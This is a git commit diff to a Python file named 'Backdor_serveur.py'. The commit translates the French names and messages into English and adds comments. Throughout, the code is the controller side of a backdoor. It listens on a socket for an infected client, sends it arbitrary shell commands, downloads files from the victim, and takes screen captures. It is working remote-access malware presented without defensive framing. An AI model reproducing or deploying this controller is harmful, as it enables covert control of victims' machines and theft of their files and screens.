c2b2fd292542b228c61f4f2621413692d4c79d25
EllailiDaoud <156137180+EllailiDaoud@users.noreply.github.com>
2024-06-27 00:56:15 +0100

    Update Backdor_serveur.py

--- Backdor_serveur.py
+++ Backdor_serveur.py
@@ -9,83 +9,108 @@
 # already used
 
 import socket
+# Configuration constants
+HOST_IP = "10.0.2.15"   # Server's IP address
+HOST_PORT = 32000       # Port for communication
+MAX_DATA_SIZE = 1024    # Maximum size of data to receive at once
 
-HOST_IP = "10.0.2.15"
-HOST_PORT = 32000
-MAX_DATA_SIZE = 1024
-
+# Create a socket object
 s = socket.socket()
+
+# Set socket options to reuse the address if it's in a TIME_WAIT state
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+# Bind the socket to the specified IP address and port
 s.bind((HOST_IP, HOST_PORT))
+
+# Listen for incoming connections
 s.listen()
 
-def sockets_receive_all_data(sockets_p, data_len):
+# Function to receive all data from a socket until the specified length
+def sockets_receive_all_data(socket_p, data_len):
     current_data_len = 0
     total_data = None
-    # print("sockets receive all data", data_len)
     while current_data_len < data_len:
         chunk_len = data_len - current_data_len
         if chunk_len > MAX_DATA_SIZE:
             chunk_len = MAX_DATA_SIZE
-        data = sockets_p.recv(chunk_len)
+        data = socket_p.recv(chunk_len)
         if not data:
             return None
-        # print("     len: ",len(data))
         if not total_data:
             total_data = data
         else:
             total_data += data
         current_data_len += len(data)
-        # print("   Total data len:", current_data_len, "/",
-        #       data_len)
     return total_data
 
-
-print(f"Attente de connexion sur {HOST_IP}, port {HOST_PORT}...")
+# Print server status
+print(f"Waiting for connection on {HOST_IP}, port {HOST_PORT}...")
+# Accept incoming connection
 connection_socket, client_address = s.accept()
-print(f"Connexion établie avec {client_address}")
+print(f"Connection established with {client_address}")
 
-def sockets_send_and_receive_all_data(sockets_p, command):
+# Function to send a command and receive all data from the socket
+def sockets_send_and_receive_all_data(socket_p, command):
     if not command:
         return None
-    sockets_p.sendall(command.encode())
+    socket_p.sendall(command.encode())
 
-    header = sockets_receive_all_data(sockets_p, 13)
-    longuer_data = int(header.decode())
+    # Receive the header containing the length of data
+    header = sockets_receive_all_data(socket_p, 13)
+    data_length = int(header.decode())
 
-    data_recues = sockets_receive_all_data(sockets_p, longuer_data)
+    # Receive all data based on the length received in the header
+    data_received = sockets_receive_all_data(socket_p, data_length)
 
-    return data_recues
+    return data_received
 
-fil_name = None
+# Initialize variable for file name
+file_name = None
+
+# Main loop to interact with the client
 while True:
+    # Send "infos" command to get initial information from client
     info = sockets_send_and_receive_all_data(connection_socket, "infos")
-    command = input(client_address[0] + ":" + str(client_address[1])
-                    + " " + info.decode() + " > ")
+
+    # Prompt for user input to send commands to client
+    command = input(f"{client_address[0]}:{client_address[1]} {info.decode()} > ")
     command_split = command.split(" ")
 
+    # Exit loop if no information is received from the client
     if not info:
         break
-    data_recues=sockets_send_and_receive_all_data(connection_socket, command)
 
+    # Send user command to client and receive response
+    data_received = sockets_send_and_receive_all_data(connection_socket, command)
+
+    # Handle file download command
     if len(command_split) == 2 and command_split[0] == "dl":
-        fil_name = command_split[1]
+        file_name = command_split[1]
+
+    # Handle screen capture command
     if len(command_split) == 2 and command_split[0] == "capture":
-        fil_name = command_split[1] + (".png")
-    if not data_recues:
+        file_name = command_split[1] + (".png")
+
+    # Exit loop if no data received from client
+    if not data_received:
         break
-    if fil_name:
-        if len(data_recues) == 1 and data_recues == b"":
-            print("ERREUE : le fichier", fil_name, " n'existe pas")
+
+    # If file name is specified, handle file transfer
+    if file_name:
+        # Check if the received data indicates the file doesn't exist
+        if len(data_received) == 1 and data_received == b"":
+            print(f"ERROR: File {file_name} does not exist on client")
         else:
-            f = open(fil_name, "wb")
-            f.write(data_recues)
-            f.close()
-            print("Fichier", fil_name, "télechergé")
-        fil_name = None
+            # Write received data to file
+            with open(file_name, "wb") as f:
+                f.write(data_received)
+            print(f"File {file_name} downloaded")
+        file_name = None
     else:
-        print(data_recues.decode())
+        # Print received data from client
+        print(data_received.decode())
 
-
+# Close server socket and connection socket
 s.close()
 connection_socket.close()
